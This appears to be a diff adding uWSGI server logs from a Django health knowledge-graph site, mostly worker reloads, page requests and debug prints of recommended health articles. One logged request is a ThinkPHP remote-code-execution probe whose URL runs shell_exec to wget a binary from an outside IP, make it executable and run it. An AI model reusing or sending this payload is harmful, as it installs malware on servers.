@@ -497,3 +497,969 @@ spawned uWSGI worker 2 (pid: 24107, cores: 2)
 spawned uWSGI worker 3 (pid: 24108, cores: 2)
 spawned uWSGI worker 4 (pid: 24109, cores: 2)
 Python auto-reloader enabled
+Sun Mar 17 06:16:14 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 24106)...
+Gracefully killing worker 2 (pid: 24107)...
+Gracefully killing worker 3 (pid: 24108)...
+Gracefully killing worker 4 (pid: 24109)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:16:15 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x12121f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x12121f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 25543, cores: 2)
+spawned uWSGI worker 2 (pid: 25544, cores: 2)
+spawned uWSGI worker 3 (pid: 25545, cores: 2)
+spawned uWSGI worker 4 (pid: 25546, cores: 2)
+Python auto-reloader enabled
+Sun Mar 17 06:32:31 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 25543)...
+Gracefully killing worker 2 (pid: 25544)...
+Gracefully killing worker 3 (pid: 25545)...
+Gracefully killing worker 4 (pid: 25546)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:32:32 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xa871f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xa871f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 27295, cores: 2)
+spawned uWSGI worker 2 (pid: 27296, cores: 2)
+spawned uWSGI worker 3 (pid: 27297, cores: 2)
+spawned uWSGI worker 4 (pid: 27298, cores: 2)
+Python auto-reloader enabled
+Sun Mar 17 06:33:12 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 27295)...
+Gracefully killing worker 2 (pid: 27296)...
+Gracefully killing worker 3 (pid: 27297)...
+Gracefully killing worker 4 (pid: 27298)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:33:14 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x1a881f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a881f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 27373, cores: 2)
+spawned uWSGI worker 2 (pid: 27374, cores: 2)
+spawned uWSGI worker 3 (pid: 27375, cores: 2)
+spawned uWSGI worker 4 (pid: 27376, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 27373|app: 0|req: 1/1] 112.10.182.10 () {42 vars in 867 bytes} [Sun Mar 17 06:41:15 2019] GET / => generated 12451 bytes in 1232 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27373|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 931 bytes} [Sun Mar 17 06:41:16 2019] GET /views/console => generated 0 bytes in 5 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+133====10
+{'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
+[pid: 27376|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 933 bytes} [Sun Mar 17 06:41:16 2019] GET /views/console/ => generated 13138 bytes in 1328 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 27373|app: 0|req: 3/4] 112.10.182.10 () {44 vars in 952 bytes} [Sun Mar 17 06:41:23 2019] GET /views/interlocution?id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 1)
+[pid: 27376|app: 0|req: 2/5] 112.10.182.10 () {44 vars in 954 bytes} [Sun Mar 17 06:41:23 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 12 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 27373|app: 0|req: 4/6] 112.10.182.10 () {46 vars in 1010 bytes} [Sun Mar 17 06:41:51 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 27373|app: 0|req: 5/7] 112.10.182.10 () {42 vars in 720 bytes} [Sun Mar 17 06:42:05 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 27374|app: 0|req: 1/8] 112.10.182.10 () {42 vars in 753 bytes} [Sun Mar 17 06:42:05 2019] GET /views/console => generated 0 bytes in 1029 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+371====6
+{'title': '推荐六款超人气胃病食疗方', 'abstract': '食疗很好的治疗胃病的方法，那么对于胃病的治疗，有哪些食疗偏方值得推荐？想要胃病治疗又该吃什么食物比较好呢？一起看下吧！', 'url': 'https://ys.99.com.cn/diaoyang/699187.htm'}
+[pid: 27373|app: 0|req: 6/9] 112.10.182.10 () {42 vars in 755 bytes} [Sun Mar 17 06:42:06 2019] GET /views/console/ => generated 13372 bytes in 236 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 27374|app: 0|req: 2/10] 112.10.182.10 () {42 vars in 765 bytes} [Sun Mar 17 06:42:10 2019] GET /views/interlocution => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 1)
+[pid: 27376|app: 0|req: 3/11] 112.10.182.10 () {42 vars in 767 bytes} [Sun Mar 17 06:42:10 2019] GET /views/interlocution/ => generated 4135 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /ws/chat/-1/
+[pid: 27374|app: 0|req: 3/12] 112.10.182.10 () {50 vars in 844 bytes} [Sun Mar 17 06:42:11 2019] GET /ws/chat/-1/ => generated 6826 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 27374|app: 0|req: 4/13] 112.10.182.10 () {44 vars in 818 bytes} [Sun Mar 17 06:46:48 2019] GET /views/interlocution/ => generated 4135 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 27374|app: 0|req: 5/14] 112.10.182.10 () {42 vars in 755 bytes} [Sun Mar 17 06:47:42 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
+[pid: 27373|app: 0|req: 7/15] 112.10.182.10 () {42 vars in 757 bytes} [Sun Mar 17 06:47:42 2019] GET /accounts/login/ => generated 5358 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+Not Found: /accounts/login/code.jpg
+[pid: 27374|app: 0|req: 6/16] 112.10.182.10 () {42 vars in 796 bytes} [Sun Mar 17 06:47:46 2019] GET /accounts/login/code.jpg => generated 8436 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+Not Found: /favicon.ico
+[pid: 27375|app: 0|req: 1/17] 112.10.182.10 () {42 vars in 772 bytes} [Sun Mar 17 06:47:46 2019] GET /favicon.ico => generated 6826 bytes in 1040 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27374|app: 0|req: 7/18] 112.10.182.10 () {52 vars in 1115 bytes} [Sun Mar 17 06:47:53 2019] POST /accounts/login/ => generated 0 bytes in 244 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
+[pid: 27375|app: 0|req: 2/19] 112.10.182.10 () {46 vars in 951 bytes} [Sun Mar 17 06:47:53 2019] GET / => generated 12451 bytes in 19 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+331====6
+{'title': '不同啤酒适合不同的人群', 'abstract': '现如今，啤酒的种类有很多，不同啤酒含有不同成分，味道和口感也有所不同，分别适合不同的人群饮用。下面我们来看看各种啤酒分别适合什么人群饮用。', 'url': 'https://ys.99.com.cn/zhinan/623855.htm'}
+[pid: 27373|app: 0|req: 8/20] 112.10.182.10 () {44 vars in 933 bytes} [Sun Mar 17 06:47:53 2019] GET /views/console/ => generated 13394 bytes in 360 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+Sun Mar 17 06:47:54 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 2 (pid: 27374)...
+Gracefully killing worker 3 (pid: 27375)...
+Gracefully killing worker 4 (pid: 27376)...
+Gracefully killing worker 1 (pid: 27373)...
+worker 2 buried after 1 seconds
+worker 1 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:47:56 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x15711f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x15711f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 28671, cores: 2)
+spawned uWSGI worker 2 (pid: 28674, cores: 2)
+spawned uWSGI worker 3 (pid: 28675, cores: 2)
+spawned uWSGI worker 4 (pid: 28676, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 28674|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 952 bytes} [Sun Mar 17 06:47:58 2019] GET /views/interlocution?id=1 => generated 0 bytes in 793 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 28674|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 954 bytes} [Sun Mar 17 06:47:59 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 22 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 28674|app: 0|req: 3/3] 112.10.182.10 () {42 vars in 784 bytes} [Sun Mar 17 06:49:08 2019] GET / => generated 11772 bytes in 60 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
+[pid: 28674|app: 0|req: 4/4] 112.10.182.10 () {44 vars in 804 bytes} [Sun Mar 17 06:49:08 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+Sun Mar 17 06:49:09 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 28671)...
+Gracefully killing worker 2 (pid: 28674)...
+Gracefully killing worker 4 (pid: 28676)...
+Gracefully killing worker 3 (pid: 28675)...
+数据库已存在！
+create neo4j class ...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 4 buried after 1 seconds
+connect succeed
+数据库已存在！
+288====3
+{'title': '冬季吃辣要得法 怎么健康地吃辣', 'abstract': '冬季寒凉，人们就喜欢吃辣来使身体暖和。但是冬季吃辣容易便秘、咽痛等，所以学会健康地吃辣是冬季的必修课。那么，冬季怎么健康地吃辣呢？', 'url': 'https://ys.99.com.cn/zhinan/593372.htm'}
+[pid: 28675|app: 0|req: 1/5] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:08 2019] GET /views/console/ => generated 13402 bytes in 2515 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+worker 3 buried after 3 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:49:12 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x25c31f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25c31f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 28826, cores: 2)
+spawned uWSGI worker 2 (pid: 28827, cores: 2)
+spawned uWSGI worker 3 (pid: 28828, cores: 2)
+spawned uWSGI worker 4 (pid: 28829, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 28828|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login => generated 0 bytes in 781 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
+[pid: 28828|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login/ => generated 5358 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 28827|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 06:49:13 2019] GET /accounts/login => generated 0 bytes in 773 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
+[pid: 28828|app: 0|req: 3/4] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 06:49:14 2019] GET /accounts/login/ => generated 5358 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 28827|app: 0|req: 2/5] 112.10.182.10 () {38 vars in 562 bytes} [Sun Mar 17 06:49:15 2019] GET /favicon.ico => generated 6826 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+Not Found: /accounts/login/code.jpg
+[pid: 28828|app: 0|req: 4/6] 112.10.182.10 () {42 vars in 788 bytes} [Sun Mar 17 06:49:18 2019] GET /accounts/login/code.jpg => generated 8436 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 28828|app: 0|req: 5/7] 112.10.182.10 () {50 vars in 1045 bytes} [Sun Mar 17 06:49:26 2019] POST /accounts/login/ => generated 0 bytes in 254 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
+[pid: 28827|app: 0|req: 3/8] 112.10.182.10 () {50 vars in 1045 bytes} [Sun Mar 17 06:49:26 2019] POST /accounts/login/ => generated 0 bytes in 342 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
+[pid: 28827|app: 0|req: 4/9] 112.10.182.10 () {46 vars in 913 bytes} [Sun Mar 17 06:49:27 2019] GET / => generated 12444 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Sun Mar 17 06:49:27 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 28826)...
+Gracefully killing worker 3 (pid: 28828)...
+Gracefully killing worker 4 (pid: 28829)...
+Gracefully killing worker 2 (pid: 28827)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 06:49:28 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x245b1f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x245b1f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 28883, cores: 2)
+spawned uWSGI worker 2 (pid: 28884, cores: 2)
+spawned uWSGI worker 3 (pid: 28885, cores: 2)
+spawned uWSGI worker 4 (pid: 28886, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 28883|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 893 bytes} [Sun Mar 17 06:49:28 2019] GET /views/console => generated 0 bytes in 741 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 0)
+389====12
+{'title': '油炸食物酥脆好吃也很伤身', 'abstract': '油炸食物是一类重油的食物，少吃是健康的保障！那么油炸食物会给身体带来哪些危害呢？如果想要了解的话，下面跟着小编一起看看吧！', 'url': 'https://ys.99.com.cn/wuqu/727878.htm'}
+[pid: 28883|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 895 bytes} [Sun Mar 17 06:49:29 2019] GET /views/console/ => generated 13374 bytes in 413 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 28886|app: 0|req: 1/3] 112.10.182.10 () {44 vars in 914 bytes} [Sun Mar 17 06:49:29 2019] GET /views/interlocution?id=2 => generated 0 bytes in 891 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 28886|app: 0|req: 2/4] 112.10.182.10 () {44 vars in 916 bytes} [Sun Mar 17 06:49:30 2019] GET /views/interlocution/?id=2 => generated 4233 bytes in 17 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+Not Found: /public/index.php
+[pid: 28886|app: 0|req: 3/5] 195.231.8.124 () {36 vars in 991 bytes} [Sun Mar 17 06:59:55 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://81.4.102.114/love/ai.x86%20;chmod%20777%20*%20ai.x86;%20cat%20ai.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 7100 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 28886|app: 0|req: 4/6] 61.7.184.43 () {32 vars in 450 bytes} [Sun Mar 17 07:41:59 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 28886|app: 0|req: 5/7] 112.10.182.10 () {46 vars in 965 bytes} [Sun Mar 17 07:54:57 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 28886|app: 0|req: 6/8] 112.10.182.10 () {46 vars in 868 bytes} [Sun Mar 17 07:55:42 2019] GET / => generated 11772 bytes in 35 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
+[pid: 28886|app: 0|req: 7/9] 112.10.182.10 () {44 vars in 804 bytes} [Sun Mar 17 07:55:42 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+Sun Mar 17 07:55:43 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 28883)...
+Gracefully killing worker 2 (pid: 28884)...
+Gracefully killing worker 3 (pid: 28885)...
+Gracefully killing worker 4 (pid: 28886)...
+165====5
